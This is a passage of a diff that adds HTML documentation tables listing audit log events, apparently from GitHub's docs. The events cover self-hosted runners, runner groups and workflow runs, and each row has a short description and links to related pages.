+          <td>Triggered when the runner application is updated. Can be viewed using the REST API and the UI. This event is not included when you export the audit log as JSON data or a CSV file. For more information, see "<a href="/en/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners">About self-hosted runners</a>" and "<a href="/en/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log">Reviewing the audit log for your organization</a>."</td>
+         </tr>
+         <tr>
+          <td><code>org.register_self_hosted_runner</code></td>
+          <td>Triggered when a new self-hosted runner is registered. For more information, see "<a href="/en/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization">Adding a self-hosted runner to an organization</a>."</td>
+         </tr>
+         <tr>
+          <td><code>org.remove_self_hosted_runner</code></td>
+          <td>Triggered when a self-hosted runner is removed. For more information, see <a href="/en/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization">Removing a runner from an organization</a>.</td>
+         </tr>
+         <tr>
+          <td><code>org.runner_group_runners_updated</code></td>
+          <td>Triggered when a runner group's list of members is updated. For more information, see "<a href="/en/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization">Set self-hosted runners in a group for an organization</a>."</td>
+         </tr>
+         <tr>
+          <td><code>org.runner_group_updated</code></td>
+          <td>Triggered when the configuration of a self-hosted runner group is changed. For more information, see "<a href="/en/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group">Changing the access policy of a self-hosted runner group</a>."</td>
+         </tr>
+         <tr>
+          <td><code>org.self_hosted_runner_updated</code></td>
+          <td>Triggered when the runner application is updated. Can be viewed using the REST API and the UI; not visible in the JSON/CSV export. For more information, see "<a href="/en/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners">About self-hosted runners</a>."</td>
+         </tr>
+         <tr>
+          <td><code>repo.register_self_hosted_runner</code></td>
+          <td>Triggered when a new self-hosted runner is registered. For more information, see "<a href="/en/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository">Adding a self-hosted runner to a repository</a>."</td>
+         </tr>
+         <tr>
+          <td><code>repo.remove_self_hosted_runner</code></td>
+          <td>Triggered when a self-hosted runner is removed. For more information, see "<a href="/en/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository">Removing a runner from a repository</a>."</td>
+         </tr>
+         <tr>
+          <td><code>repo.self_hosted_runner_updated</code></td>
+          <td>Triggered when the runner application is updated. Can be viewed using the REST API and the UI; not visible in the JSON/CSV export. For more information, see "<a href="/en/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners">About self-hosted runners</a>."</td>
+         </tr>
+        </tbody>
+       </table> 
+       <h4 id="events-for-self-hosted-runner-groups"><a href="#events-for-self-hosted-runner-groups">Events for self-hosted runner groups</a></h4> 
+       <table>
+        <thead>
+         <tr>
+          <th>Action</th>
+          <th>Description</th>
+         </tr>
+        </thead>
+        <tbody>
+         <tr>
+          <td><code>enterprise.runner_group_created</code></td>
+          <td>Triggered when a self-hosted runner group is created. For more information, see "<a href="/en/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise">Creating a self-hosted runner group for an enterprise</a>."</td>
+         </tr>
+         <tr>
+          <td><code>enterprise.runner_group_removed</code></td>
+          <td>Triggered when a self-hosted runner group is removed. For more information, see "<a href="/en/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group">Removing a self-hosted runner group</a>."</td>
+         </tr>
+         <tr>
+          <td><code>enterprise.runner_group_runner_removed</code></td>
+          <td>Triggered when the REST API is used to remove a self-hosted runner from a group.</td>
+         </tr>
+         <tr>
+          <td><code>enterprise.runner_group_runners_added</code></td>
+          <td>Triggered when a self-hosted runner is added to a group. For more information, see "<a href="/en/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group">Moving a self-hosted runner to a group</a>."</td>
+         </tr>
+         <tr>
+          <td><code>enterprise.runner_group_updated</code></td>
+          <td>Triggered when the configuration of a self-hosted runner group is changed. For more information, see "<a href="/en/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group">Changing the access policy of a self-hosted runner group</a>."</td>
+         </tr>
+         <tr>
+          <td><code>org.runner_group_created</code></td>
+          <td>Triggered when a self-hosted runner group is created. For more information, see "<a href="/en/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization">Creating a self-hosted runner group for an organization</a>."</td>
+         </tr>
+         <tr>
+          <td><code>org.runner_group_removed</code></td>
+          <td>Triggered when a self-hosted runner group is removed. For more information, see "<a href="/en/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group">Removing a self-hosted runner group</a>."</td>
+         </tr>
+         <tr>
+          <td><code>org.runner_group_runners_added</code></td>
+          <td>Triggered when a self-hosted runner is added to a group. For more information, see "<a href="/en/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group">Moving a self-hosted runner to a group</a>."</td>
+         </tr>
+         <tr>
+          <td><code>org.runner_group_runner_removed</code></td>
+          <td>Triggered when the REST API is used to remove a self-hosted runner from a group. For more information, see "<a href="/en/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization">Remove a self-hosted runner from a group for an organization</a>."</td>
+         </tr>
+        </tbody>
+       </table> 
+       <h4 id="events-for-workflow-activities"><a href="#events-for-workflow-activities">Events for workflow activities</a></h4> 
+       <table>
+        <thead>
+         <tr>
+          <th>Action</th>
+          <th>Description</th>
+         </tr>
+        </thead>
+        <tbody>
+         <tr>
+          <td><code>cancel_workflow_run</code></td>
+          <td>Triggered when a workflow run has been cancelled. For more information, see "<a href="/en/actions/managing-workflow-runs/canceling-a-workflow">Canceling a workflow</a>."</td>
+         </tr>
+         <tr>
+          <td><code>completed_workflow_run</code></td>
+          <td>Triggered when a workflow status changes to <code>completed</code>. Can only be viewed using the REST API; not visible in the UI or the JSON/CSV export. For more information, see "<a href="/en/actions/managing-workflow-runs/viewing-workflow-run-history">Viewing workflow run history</a>."</td>
+         </tr>
+         <tr>
+          <td><code>created_workflow_run</code></td>
+          <td>Triggered when a workflow run is created. Can only be viewed using the REST API; not visible in the UI or the JSON/CSV export. For more information, see "<a href="/en/actions/learn-githu
